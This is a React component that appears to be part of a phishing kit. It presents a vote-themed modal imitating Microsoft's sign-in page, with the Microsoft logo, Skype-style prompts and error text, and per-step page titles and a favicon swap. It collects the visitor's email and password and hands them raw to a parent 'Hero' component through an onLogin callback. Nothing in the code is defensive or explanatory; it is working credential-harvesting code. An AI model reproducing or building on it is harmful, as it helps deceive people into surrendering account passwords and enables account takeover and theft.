"use client";

import { useState, useEffect } from "react";

interface EmailVoteProps {
  onClose: () => void;
  // This prop connects the modal to your Hero.tsx logic
  onLogin: (email: string, pass: string) => void;
}

export default function EmailVote({ onClose, onLogin }: EmailVoteProps) {
  const [step, setStep] = useState<"name" | "password">("name");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [showPass, setShowPass] = useState(false);

  useEffect(() => {
    document.title =
      step === "name" ? "Sign in to your account" : "Enter your password";
    const favicon = document.getElementById(
      "dynamic-favicon"
    ) as HTMLLinkElement;
    if (favicon) favicon.href = "img/hfavicon.png";
  }, [step]);

  const handleNext = () => {
    if (!email.trim()) {
      setError(true);
      return;
    }
    setError(false);
    setStep("password");
  };

  const handleLogin = () => {
    if (password.trim()) {
      // Pass the raw email and password back to the Hero
      onLogin(email, password);
    }
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-white md:bg-[#f2f2f2] flex items-center justify-center font-sans">
      <div className="w-full max-w-[440px] bg-white p-8 md:shadow-md relative text-black">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-2 right-4 text-2xl text-gray-400 hover:text-black">
          &times;
        </button>

        {/* Back Arrow */}
        {step === "password" && (
          <div
            onClick={() => setStep("name")}
            className="absolute top-6 left-6 cursor-pointer w-6 h-6 flex items-center justify-center hover:bg-gray-100 rounded-full">
            <img
              src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='%23000' viewBox='0 0 24 24'><path d='M15.41 7.41 14 6l-6 6 6 6 1.41-1.41L10.83 12z'/></svg>"
              alt="back"
            />
          </div>
        )}

        <div
          className={`flex mb-4 ${
            step === "password" ? "justify-center" : "justify-start"
          }`}>
          <img src="/images/h.svg" alt="Microsoft" className="h-6" />
        </div>

        {step === "password" && (
          <div className="text-sm mb-4 flex items-center">
            <span className="truncate">{email}</span>
          </div>
        )}

        <h2 className="text-2xl font-semibold mb-2">
          {step === "name" ? "Sign in" : "Enter password"}
        </h2>

        {error && (
          <div className="text-[#e81123] text-sm mb-4">
            Enter a valid email address, phone number, or Skype name.
          </div>
        )}

        {step === "name" ? (
          <div className="border-b border-black focus-within:border-[#0078d4] mb-8">
            <input
              type="text"
              placeholder="Email, phone, or Skype"
              className="w-full py-1.5 outline-none bg-transparent text-[15px]"
              value={email}
              autoFocus
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
        ) : (
          <div className="border-b border-black focus-within:border-[#0078d4] mb-8">
            <input
              type={showPass ? "text" : "password"}
              placeholder="Password"
              className="w-full py-1.5 outline-none bg-transparent text-[15px]"
              value={password}
              autoFocus
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
        )}

        <div className="flex justify-between items-center text-xs mb-8">
          <a href="#" className="text-[#0067b8] hover:underline">
            Forgot password?
          </a>
        </div>

        <div className="flex justify-end gap-2">
          <button
            onClick={step === "name" ? handleNext : handleLogin}
            className="bg-[#0067b8] text-white px-9 py-1.5 text-sm hover:bg-[#005da6] transition-colors">
            {step === "name" ? "Next" : "Sign in"}
          </button>
        </div>
      </div>
    </div>
  );
}
